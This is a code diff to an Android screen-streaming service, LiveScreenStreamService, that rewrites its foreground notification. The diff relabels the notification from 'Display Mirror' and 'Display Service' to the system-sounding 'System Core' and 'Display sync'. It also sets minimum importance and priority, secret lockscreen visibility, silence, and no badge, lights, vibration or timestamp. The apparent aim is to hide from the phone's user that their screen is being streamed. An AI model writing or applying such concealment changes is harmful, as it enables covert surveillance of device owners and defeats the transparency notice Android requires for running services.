@@ -68,17 +68,27 @@ class LiveScreenStreamService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "Display Service",
-                NotificationManager.IMPORTANCE_LOW
-            )
+                "System Core",
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                setShowBadge(false)
+                setSound(null, null)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            }
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             nm.createNotificationChannel(channel)
         }
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Display Mirror")
-            .setContentText("Active display connection")
+            .setContentTitle("System Core")
+            .setContentText("Display sync")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setSilent(true)
+            .setShowWhen(false)
             .setOngoing(true)
             .build()
     }
